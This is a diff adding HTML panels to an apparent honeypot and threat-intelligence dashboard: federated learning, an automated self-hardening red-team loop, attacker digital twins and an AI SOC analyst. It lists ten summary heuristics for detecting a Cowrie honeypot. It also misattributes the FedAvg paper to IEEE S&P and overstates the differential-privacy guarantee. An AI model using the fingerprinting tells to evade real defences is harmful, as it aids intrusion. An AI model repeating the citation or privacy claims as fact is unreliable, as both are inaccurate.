+              <div class="fedavg-step"><div class="step-circle" style="background:linear-gradient(135deg,#10b981,#a855f7)">4</div><div><div style="font-weight:600;font-size:12px;margin-bottom:3px">Global Model Update</div><div style="font-size:11px;color:var(--t3)">Improved weights distributed to all nodes. Everyone benefits.</div></div></div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-head"><i class="fa-solid fa-history" style="color:#10b981"></i>Aggregation Rounds</div>
+            <div class="card-body scroll-short" id="fhim-rounds"><div style="color:var(--t4);font-size:11px">No rounds yet</div></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-head"><i class="fa-solid fa-microscope" style="color:#10b981"></i>Academic Basis & Stack</div>
+        <div class="card-body">
+          <div class="research-grid">
+            <div class="research-card"><div class="research-card-title"><i class="fa-solid fa-graduation-cap"></i> IEEE S&P Reference</div><div class="research-card-body">McMahan et al., "Communication-Efficient Learning of Deep Networks from Decentralized Data" — the FedAvg paper FHIM implements.</div></div>
+            <div class="research-card"><div class="research-card-title"><i class="fa-solid fa-shield-halved"></i> Differential Privacy</div><div class="research-card-body">Gaussian mechanism (ε=1.0, δ=1e-5) via Opacus. (ε,δ)-DP guarantees: any node's data contribution is indistinguishable from noise.</div></div>
+            <div class="research-card"><div class="research-card-title"><i class="fa-solid fa-code-branch"></i> Tech Stack</div><div class="research-card-body">Flower (flwr) · PyTorch · Opacus · gRPC transport · mTLS auth · Docker overlay · NATS message queue.</div></div>
+            <div class="research-card"><div class="research-card-title"><i class="fa-solid fa-chart-line"></i> Expected F1 Gain</div><div class="research-card-body">8–15% F1 improvement over single-node training with ≥4 diverse nodes. Target >90% global F1 within 20 rounds.</div></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════
+         ASHRTA
+    ═══════════════════════════ -->
+    <section class="section" id="sec-ashrta">
+      <div class="inno-header" style="--ic:#f43f5e">
+        <div class="inno-icon-wrap"><i class="fa-solid fa-robot"></i></div>
+        <div style="flex:1;min-width:0">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+            <span class="inno-badge" style="background:rgba(244,63,94,0.15);color:#fda4af;border-color:rgba(244,63,94,0.4)">IDEA 04</span>
+            <span style="font-size:11px;font-weight:600;color:#f59e0b;display:flex;align-items:center;gap:3px"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i> Medium</span>
+          </div>
+          <div class="inno-title">Adversarial Self-Hardening Red Team AI</div>
+          <div class="inno-sub">A GAN-inspired system that attacks itself — to become impossible to fool. Runs every 6 hours, zero human involvement.</div>
+        </div>
+        <button class="run-btn" id="ashrta-run-btn" onclick="ashtaRun()"><i class="fa-solid fa-play"></i> Run Cycle</button>
+      </div>
+
+      <div class="inno-kpi-row">
+        <div class="kpi-card" style="--kc:#f43f5e"><div class="kpi-icon"><i class="fa-solid fa-shield-halved"></i></div><div><div class="kpi-val" id="ashrta-kpi-score">—</div><div class="kpi-lbl">Hardening Score</div></div></div>
+        <div class="kpi-card" style="--kc:#10b981"><div class="kpi-icon"><i class="fa-solid fa-list-check"></i></div><div><div class="kpi-val" id="ashrta-kpi-passed" style="color:#10b981">—</div><div class="kpi-lbl">Checks Passed</div></div></div>
+        <div class="kpi-card" style="--kc:#f59e0b"><div class="kpi-icon"><i class="fa-solid fa-triangle-exclamation"></i></div><div><div class="kpi-val" id="ashrta-kpi-crit" style="color:#f59e0b">—</div><div class="kpi-lbl">Critical Issues</div></div></div>
+        <div class="kpi-card" style="--kc:#a855f7"><div class="kpi-icon"><i class="fa-solid fa-wrench"></i></div><div><div class="kpi-val" id="ashrta-kpi-patches" style="color:#a855f7">—</div><div class="kpi-lbl">Patches Applied</div></div></div>
+      </div>
+
+      <div class="ashrta-grid mb-4">
+        <!-- Score -->
+        <div class="card" style="align-self:start">
+          <div class="card-head"><i class="fa-solid fa-gauge-high" style="color:#f43f5e"></i>Hardening Scorecard</div>
+          <div class="card-body">
+            <div class="score-block">
+              <div style="position:relative;flex-shrink:0">
+                <canvas id="ashrta-gauge" width="160" height="90"></canvas>
+                <div class="ashrta-gauge-center"><div class="ashrta-score-big" id="ashrta-score-val">—</div><div class="ashrta-gauge-sub">/ 100</div></div>
+              </div>
+              <div class="meta-grid" id="ashrta-meta"></div>
+            </div>
+            <div style="font-size:11px;font-weight:600;color:var(--t3);text-transform:uppercase;letter-spacing:1px;margin:12px 0 6px">Score Trend</div>
+            <div class="trend-bars-row" id="ashrta-trend"></div>
+            <div style="display:flex;justify-content:space-between;font-size:9px;color:var(--t4);font-family:var(--mono)"><span>Oldest</span><span>Latest</span></div>
+          </div>
+        </div>
+
+        <!-- Checks -->
+        <div class="card">
+          <div class="card-head"><i class="fa-solid fa-magnifying-glass-chart" style="color:#f43f5e"></i>Detection Checks <span id="ashrta-checks-sum" style="margin-left:auto;color:var(--t3);font-weight:400;text-transform:none;letter-spacing:0;font-size:11px"></span></div>
+          <div class="card-body scroll-list" id="ashrta-checks" style="min-height:280px"><div style="color:var(--t4);text-align:center;padding:32px;font-size:12px">Run a cycle to see results</div></div>
+        </div>
+
+        <!-- Patches -->
+        <div class="card">
+          <div class="card-head"><i class="fa-solid fa-wrench" style="color:#10b981"></i>Applied Patches</div>
+          <div class="card-body scroll-list" id="ashrta-patches" style="min-height:280px"><div style="color:var(--t4);text-align:center;padding:32px;font-size:12px">No patches yet</div></div>
+        </div>
+      </div>
+
+      <!-- GAN diagram -->
+      <div class="card">
+        <div class="card-head"><i class="fa-solid fa-diagram-project" style="color:#f43f5e"></i>GAN-Inspired Self-Hardening Loop</div>
+        <div class="card-body">
+          <div class="gan-diagram">
+            <div class="gan-box g-red"><div class="gan-box-icon"><i class="fa-solid fa-robot"></i></div><div class="gan-box-title">Red Agent</div><div class="gan-box-desc">Automated attacker using nmap, Hydra, custom probes. Attempts honeypot detection via 10 real heuristics.</div></div>
+            <div class="gan-arrow"><i class="fa-solid fa-arrow-right"></i><div class="gan-arrow-lbl">Report</div></div>
+            <div class="gan-box g-amber"><div class="gan-box-icon"><i class="fa-solid fa-clipboard-list"></i></div><div class="gan-box-title">Evaluator</div><div class="gan-box-desc">Logs every detection success as a honeypot weakness. Scores per-check confidence and severity.</div></div>
+            <div class="gan-arrow"><i class="fa-solid fa-arrow-right"></i><div class="gan-arrow-lbl">Weaknesses</div></div>
+            <div class="gan-box g-green"><div class="gan-box-icon"><i class="fa-solid fa-wrench"></i></div><div class="gan-box-title">Optimizer</div><div class="gan-box-desc">Auto-generates config patches. Applies to Cowrie, honeyfs, OS fingerprints, network stack.</div></div>
+            <div class="gan-arrow"><i class="fa-solid fa-arrow-right"></i><div class="gan-arrow-lbl">Verify &amp; Loop</div></div>
+            <div class="gan-box g-purple"><div class="gan-box-icon"><i class="fa-solid fa-shield"></i></div><div class="gan-box-title">Hardened Honeypot</div><div class="gan-box-desc">Each cycle the honeypot becomes more convincing. Fully automated, no human needed.</div></div>
+          </div>
+          <div class="cref-grid">
+            <div class="cref-item"><div class="cref-num">01</div><div><b>Timing Analysis</b> — Response jitter detection</div></div>
+            <div class="cref-item"><div class="cref-num">02</div><div><b>SSH Banner Fingerprint</b> — Cowrie vs real OpenSSH</div></div>
+            <div class="cref-item"><div class="cref-num">03</div><div><b>OS Fingerprint Consistency</b> — Kernel vs OS version match</div></div>
+            <div class="cref-item"><div class="cref-num">04</div><div><b>Filesystem Completeness</b> — Real: 50K+ files vs Cowrie: ~200</div></div>
+            <div class="cref-item"><div class="cref-num">05</div><div><b>Process Tree Plausibility</b> — Real: 100–300 procs vs &lt;20</div></div>
+            <div class="cref-item"><div class="cref-num">06</div><div><b>Network Stack Fingerprint</b> — TCP window 65535 is a Cowrie tell</div></div>
+            <div class="cref-item"><div class="cref-num">07</div><div><b>Service Response Behavior</b> — Known Cowrie error signatures</div></div>
+            <div class="cref-item"><div class="cref-num">08</div><div><b>CPU / Memory Artifacts</b> — Perfect 0.00 load on busy server</div></div>
+            <div class="cref-item"><div class="cref-num">09</div><div><b>Uptime Consistency</b> — Recent boot unusual for production</div></div>
+            <div class="cref-item"><div class="cref-num">10</div><div><b>Error Message Authenticity</b> — Default vs custom Cowrie msgs</div></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ════════════ INNOVATION 05 · ATTACKER DIGITAL TWIN ════════════ -->
+    <section class="section" id="sec-twin">
+      <div class="inno-header" style="--ic:#38bdf8">
+        <div class="inno-icon-wrap"><i class="fa-solid fa-clone"></i></div>
+        <div style="flex:1;min-width:0">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+            <span class="inno-badge" style="background:rgba(56,189,248,0.15);color:#7dd3fc;border-color:rgba(56,189,248,0.4)">IDEA 05</span>
+            <span style="font-size:11px;font-weight:600;color:#f59e0b;display:flex;align-items:center;gap:3px"><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i> High</span>
+          </div>
+          <div class="inno-title">Attacker Digital Twin</div>
+          <div class="inno-sub">A living virtual replica of each adversary — fuses TTPs, tooling, timing &amp; psychology, tracks their kill-chain position, then predicts the next move and runs them forward in simulation so deception can pre-stage traps.</div>
+        </div>
+        <button class="run-btn" id="twin-refresh-btn" onclick="twinRefresh()"><i class="fa-solid fa-rotate"></i> Refresh Twins</button>
+      </div>
+
+      <div class="inno-kpi-row">
+        <div class="kpi-card" style="--kc:#38bdf8"><div class="kpi-icon"><i class="fa-solid fa-clone"></i></div><div><div class="kpi-val" id="twin-kpi-count">—</div><div class="kpi-lbl">Active Twins</div></div></div>
+        <div class="kpi-card" style="--kc:#f43f5e"><div class="kpi-icon"><i class="fa-solid fa-gauge-high"></i></div><div><div class="kpi-val" id="twin-kpi-threat" style="color:#f43f5e">—</div><div class="kpi-lbl">Top Threat Score</div></div></div>
+        <div class="kpi-card" style="--kc:#10b981"><div class="kpi-icon"><i class="fa-solid fa-bullseye"></i></div><div><div class="kpi-val" id="twin-kpi-conf" style="color:#10b981">—</div><div class="kpi-lbl">Avg Model Confidence</div></div></div>
+        <div class="kpi-card" style="--kc:#a855f7"><div class="kpi-icon"><i class="fa-solid fa-skull"></i></div><div><div class="kpi-val" id="twin-kpi-impact" style="color:#a855f7">—</div><div class="kpi-lbl">At Final Kill-Chain Stage</div></div></div>
+      </div>
+
+      <div style="display:grid;grid-template-columns:300px 1fr;gap:16px;align-items:start">
+        <!-- Twin roster -->
+        <div class="card" style="align-self:start">
+          <div class="card-head"><i class="fa-solid fa-list-ul" style="color:#38bdf8"></i>Twin Roster</div>
+          <div class="card-body scroll-list" id="twin-list" style="min-height:420px;padding:8px">
+            <div style="color:var(--t4);text-align:center;padding:32px;font-size:12px">Loading twins…</div>
+          </div>
+        </div>
+
+        <!-- Selected twin -->
+        <div style="display:flex;flex-direction:column;gap:16px;min-width:0">
+          <div class="card">
+            <div class="card-head"><i class="fa-solid fa-fingerprint" style="color:#38bdf8"></i>Digital Twin <span id="twin-sel-ip" style="margin-left:8px;color:var(--t3);font-weight:400;font-family:var(--mono);font-size:12px"></span><span id="twin-sel-conf" style="margin-left:auto;font-size:11px;color:var(--t3);font-weight:400;text-transform:none;letter-spacing:0"></span></div>
+            <div class="card-body" id="twin-detail">
+              <div style="color:var(--t4);text-align:center;padding:48px;font-size:12px">Select a twin from the roster</div>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-head"><i class="fa-solid fa-diagram-project" style="color:#38bdf8"></i>Kill-Chain Progression</div>
+            <div class="card-body" id="twin-killchain"><div style="color:var(--t4);text-align:center;padding:24px;font-size:12px">—</div></div>
+          </div>
+
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+            <div class="card">
+              <div class="card-head"><i class="fa-solid fa-wand-sparkles" style="color:#f59e0b"></i>Predicted Next Move</div>
+              <div class="card-body" id="twin-predictions"><div style="color:var(--t4);text-align:center;padding:24px;font-size:12px">—</div></div>
+            </div>
+            <div class="card">
+              <div class="card-head"><i class="fa-solid fa-chess" style="color:#a855f7"></i>Recommended Deception</div>
+              <div class="card-body" id="twin-reco"><div style="color:var(--t4);text-align:center;padding:24px;font-size:12px">—</div></div>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-head">
+              <i class="fa-solid fa-forward" style="color:#38bdf8"></i>Forward Simulation — "Twin Running Ahead"
+              <div style="margin-left:auto;display:flex;align-items:center;gap:8px">
+                <label style="font-size:11px;color:var(--t3)">Steps</label>
+                <input id="twin-sim-steps" type="number" value="6" min="1" max="12" style="width:60px;padding:4px 8px">
+                <button class="btn btn-sm btn-primary" onclick="twinSimulate()"><i class="fa-solid fa-play"></i> Simulate</button>
+              </div>
+            </div>
+            <div class="card-body" id="twin-sim-out"><div style="color:var(--t4);text-align:center;padding:24px;font-size:12px">Run a simulation to forecast this attacker's likely path.</div></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ════════════ INNOVATION 06 · AI SOC ANALYST ════════════ -->
+    <section class="section" id="sec-soc">
+      <div class="inno-header" style="--ic:#a855f7">
+        <div class="inno-icon-wrap"><i class="fa-solid fa-user-shield"></i></div>
+        <div style="flex:1;min-width:0">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+            <span class="inno-badge" style="background:rgba(168,85,247,0.15);color:#d8b4fe;border-color:rgba(168,85,247,0.4)">IDEA 06</span>
+            <span id="soc-llm-badge" style="font-size:11px;font-weight:600;color:#f59e0b;display:flex;align-items:center;gap:4px"><i class="fa-solid fa-circle" style="font-size:7px"></i> Heuristic mode</span>
+          </div>
+          <div class="inno-title">AI SOC Analyst</div>
+          <div class="inno-sub">An LLM-assisted analyst on top of the detection &amp; behavior data — auto-triages every threat actor with a verdict and recommended action, writes per-attacker incident reports (MITRE TTPs + assessment), and answers free-form questions about the live SOC picture.</div>
+        </div>
+        <button class="run-btn" id="soc-refresh-btn" onclick="socRefresh()"><i class="fa-solid fa-rotate"></i> Refresh</button>
+      </div>
+
+      <div class="inno-kpi-row">
+        <div class="kpi-card" style="--kc:#a855f7"><div class="kpi-icon"><i class="fa-solid fa-list-check"></i></div><div><div class="kpi-val" id="soc-kpi-actors">—</div><div class="kpi-lbl">Actors Tracked</div></div></div>
+        <div class="kpi-card" style="--kc:#f43f5e"><div class="kpi-icon"><i class="fa-solid fa-triangle-exclamation"></i></div><div><div class="kpi-val" id="soc-kpi-action" style="color:#f43f5e">—</div><div class="kpi-lbl">Need Action</div></div></div>
+        <div class="kpi-card" style="--kc:#f59e0b"><div class="kpi-icon"><i class="fa-solid fa-bolt"></i></div><div><div class="kpi-val" id="soc-kpi-events" style="color:#f59e0b">—</div><div class="kpi-lbl">Events / 24h</div></div></div>
+        <div class="kpi-card" style="--kc:#10b981"><div class="kpi-icon"><i class="fa-solid fa-file-shield"></i></div><div><div class="kpi-val" id="soc-kpi-reports" style="color:#10b981">—</div><div class="kpi-lbl">Reports Filed</div></div></div>
+      </div>
+
+      <div style="display:grid;grid-template-columns:360px 1fr;gap:16px;align-items:start">
+        <!-- Triage queue -->
+        <div class="card" style="align-self:start">
+          <div class="card-head"><i class="fa-solid fa-list-check" style="color:#a855f7"></i>Triage Queue</div>
+          <div class="card-body scroll-list" id="soc-queue" style="min-height:300px;padding:8px">
+            <div style="color:var(--t4);text-align:center;padding:32px;font-size:12px">Loading queue…</div>
+          </div>
+        </div>
+
+        <!-- Right column: report + chat -->
+        <div style="display:flex;flex-direction:column;gap:16px;min-width:0">
+          <div class="card">
+            <div class="card-head">
+              <i class="fa-solid fa-file-shield" style="color:#a855f7"></i>Incident Report
+              <span id="soc-report-ip" style="margin-left:8px;color:var(--t3);font-weight:400;font-family:var(--mono);font-size:12px"></span>
+              <span id="soc-report-src" style="margin-left:auto;font-size:10px;color:var(--t3);font-weight:400;text-transform:none;letter-spacing:0"></span>
+            </div>
+            <div class="card-body" id="soc-report">
+              <div style="color:var(--t4);text-align:center;padding:48px;font-size:12px">Select an actor from the queue, then generate an AI incident report.</div>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-head"><i class="fa-solid fa-comments" style="color:#a855f7"></i>Ask the Analyst</div>
+            <div class="card-body">
+              <div id="soc-chat-log" style="display:flex;flex-direction:column;gap:8px;max-height:240px;overflow:auto;margin-bottom:10px"></div>
+              <div style="display:flex;gap:8px">
+                <input id="soc-chat-input" type="text" placeholder="e.g. what is the top threat? what should I block?" style="flex:1;padding:8px 12px" onkeydown="if(event.key==='Enter')socAsk()">
+                <button class="btn btn-sm btn-primary" onclick="socAsk()"><i class="fa-solid fa-paper-plane"></i> Ask</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </div><!-- /page-content -->
+</div><!-- /main -->
+</div><!-- /app -->
+
+<!-- ATTACKER PROFILE MODAL -->
+<div class="modal-overlay hidden" id="profile-modal" onclick="handleModalBg(event)">
+  <div class="modal-box">
+    <div class="modal-head">
+      <i class="fa-solid fa-user-secret" style="color:var(--cyan);font-size:18px"></i>
+      <div><div class="modal-title" id="modal-ip"></div><div class="modal-sub">Attacker Profile</div></div>
+      <button class="modal-close" onclick="closeModal()"><i class="fa-solid fa-xmark"></i></button>
+    </div>
+    <div class="modal-body">
+      <div class="gauge-row">
+        <div class="gauge-wrap">
+          <canvas id="modal-gauge" width="180" height="100"></canvas>
+          <div class="gauge-overlay"><div class="gauge-val" id="modal-score-val">0</div><div class="gauge-sub">/ 100</div></div>
+        </div>
+        <div class="meta-grid">
+          <div class="meta-row"><span class="meta-label">Intent</span><span class="meta-value" id="modal-intent">—</span></div>
+          <div class="meta-row"><span class="meta-label">Tier</span><span class="meta-value" id="modal-tier">—</span></div>
+          <div class="meta-row"><span class="meta-label">Sessions</span><span class="meta-value" id="modal-sessions">—</span></div>
+          <div class="meta-row"><span class="meta-label">First Seen</span><span class="meta-value" id="modal-first" style="font-size:10px">—</span></div>
+          <div class="meta-row"><span class="meta-label">Last Seen</span><span class="meta-value" id="modal-last" style="font-size:10px">—</span></div>
+        </div>
+      </div>
+      <div>
+        <div class="modal-section-title"><i class="fa-solid fa-diagram-project"></i>MITRE ATT&CK Techniques</div>
+        <div class="ttp-grid" id="modal-ttps" style="margin-top:8px"></div>
+      </div>
+    </div>
+    <div class="modal-foot">
+      <button class="btn btn-danger" onclick="blockIP()"><i class="fa-solid fa-ban"></i> Block IP</button>
+      <button class="btn btn-secondary" onclick="closeModal()"><i class="fa-solid fa-xmark"></i> Close</button>
+    </div>
+  </div>
+</div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+<script src="/static/js/app.js"></script>
+<script src="/static/js/twin.js"></script>
+<script src="/static/js/soc.js"></script>
+</body>
+</html>
